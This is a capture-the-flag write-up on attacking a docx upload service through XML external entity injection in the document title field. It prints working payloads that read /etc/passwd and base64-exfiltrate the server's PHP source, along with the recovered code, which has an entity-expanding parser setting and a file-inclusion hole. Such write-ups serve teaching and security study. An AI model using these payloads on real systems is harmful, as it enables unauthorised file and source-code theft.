### Docx uploader
 ( intro)
 
 docx - basically zip file with xml in it
 modify


###

Post sample -> document title in response, so focus on injecting the title field in XML. Use sample.docx as base.

Php code in title didnt display/work (?) so tried XXE.. [1]


### TL;DR payloads

core.xml contents ( because it contains doc title returned)  -  only changes is XXE and &test;  ( entity name) in <dc:title>

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<dc:title>&test;</dc:title>
<dc:subject></dc:subject><dc:creator></dc:creator><cp:keywords></cp:keywords><dc:description></dc:description><cp:lastModifiedBy></cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2015-08-01T19:00:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2015-09-08T19:22:00Z</dcterms:modified></cp:coreProperties>
```


`<!DOCTYPE test [<!ENTITY test SYSTEM 'random'>]>` to force error



`<!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=file:///var/www/html/upload.php'>|>`  to exfiltrate 


### source code returned

```
Title 'PD9waHAKCnNlc3Npb25fc3RhcnQoKTsKaWYgKCFpc3NldCgkX1NFU1NJT05bJ3JlZmVycmVyJ10pKSB7CgkkX1NFU1NJT05bJ3JlZmVycmVyJ10gPSBpc3NldCgkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10pID8gJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddIDogJ24vYSc7CgkkX1NFU1NJT05bJ3VzZXItYWdlbnQnXSA9IGlzc2V0KCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkgPyAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10gOiAnbi9hJzt9CgppZihpc3NldCgkX1BPU1RbInN1Ym1pdCJdKSkgewogICAgJHRhcmdldF9maWxlID0gZ2V0Y3dkKCkuIi91cGxvYWQvIi5tZDUoJF9GSUxFU1siZmlsZSJdWyJ0bXBfbmFtZSJdKTsKICAgIGlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1siZmlsZSJdWyJ0bXBfbmFtZSJdLCAkdGFyZ2V0X2ZpbGUpKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJHJlc3VsdCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJ6aXA6Ly8iLiR0YXJnZXRfZmlsZS4iI2RvY1Byb3BzL2NvcmUueG1sIik7CiAgICAgICAgICAgICR4bWwgPSBuZXcgU2ltcGxlWE1MRWxlbWVudCgkcmVzdWx0LCBMSUJYTUxfTk9FTlQpOwogICAgICAgICAgICAkeG1sLT5yZWdpc3RlclhQYXRoTmFtZXNwYWNlKCJkYyIsICJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIpOwogICAgICAgICAgICBmb3JlYWNoKCR4bWwtPnhwYXRoKCcvL2RjOnRpdGxlJykgYXMgJHRpdGxlKXsKICAgICAgICAgICAgICAgIGVjaG8gIlRpdGxlICciLiR0aXRsZSAuICInIGhhcyBiZWVuIGFkZGVkLjxici8+IjsKICAgICAgICAgICAgfQogICAgICAgICAgICBlY2hvKCR0YXJnZXRfZmlsZSk7CiAgICAgICAgICAgIGVjaG8oIlxuIik7CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRlKXsKICAgICAgICAgICAgcHJpbnRfcigkZSk7CiAgICAgICAgICAgIGVjaG8gIlRoZSBmaWxlIHlvdSB1cGxvYWRlZCBpcyBub3QgYSB2YWxpZCB4bWwgb3IgZG9jeCBmaWxlLiI7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICJTb3JyeSwgdGhlcmUgd2FzIGFuIGVycm9yIHVwbG9hZGluZyB5b3VyIGZpbGUuIjsKICAgIH0KfQoKIyBicmJ7MWEyMjBkOWYzNDY0MjI4OTA5NGI4YjZkMGQ0MzQzOWJ9CgppZiAoaXNzZXQoJF9HRVRbJzFjYTI1MWU2NjkzOGIxMTVlYmQ4OWM4ZjViYjNjN2Y5YjBmNmFiNDM5ODEwNGQ0YzI1NGNkYmM1ZTY1NTUxNzEnXSkgIT0gTlVMTCkgewogICAgZWNobyAiPHA+IjsKICAgIGluY2x1ZGUoIi92YXIvd3d3L2h0bWwvIiAuJF9HRVRbJzFjYTI1MWU2NjkzOGIxMTVlYmQ4OWM4ZjViYjNjN2Y5YjBmNmFiNDM5ODEwNGQ0YzI1NGNkYmM1ZTY1NTUxNzEnXSk7CiAgICBlY2hvICI8L3A+IjsKfQo=' has been added.
/var/www/html/upload/78b8b7de14e5571a0d03b972199e44cb 

```

decoded

```

<?php

session_start();
if (!isset($_SESSION['referrer'])) {
	$_SESSION['referrer'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'n/a';
	$_SESSION['user-agent'] = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'n/a';}

if(isset($_POST["submit"])) {
    $target_file = getcwd()."/upload/".md5($_FILES["file"]["tmp_name"]);
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        try {
            $result = file_get_contents("zip://".$target_file."#docProps/core.xml");
            $xml = new SimpleXMLElement($result, LIBXML_NOENT);
            $xml->registerXPathNamespace("dc", "http://purl.org/dc/elements/1.1/");
            foreach($xml->xpath('//dc:title') as $title){
                echo "Title '".$title . "' has been added.<br/>";
            }
            echo($target_file);
            echo("\n");
        } catch (Exception $e){
            print_r($e);
            echo "The file you uploaded is not a valid xml or docx file.";
        }
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}

# brb{1a220d9f34642289094b8b6d0d43439b}

if (isset($_GET['1ca251e66938b115ebd89c8f5bb3c7f9b0f6ab4398104d4c254cdbc5e6555171']) != NULL) {
    echo "<p>";
    include("/var/www/html/" .$_GET['1ca251e66938b115ebd89c8f5bb3c7f9b0f6ab4398104d4c254cdbc5e6555171']);
    echo "</p>";
}
```


### Credits

[1] https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/

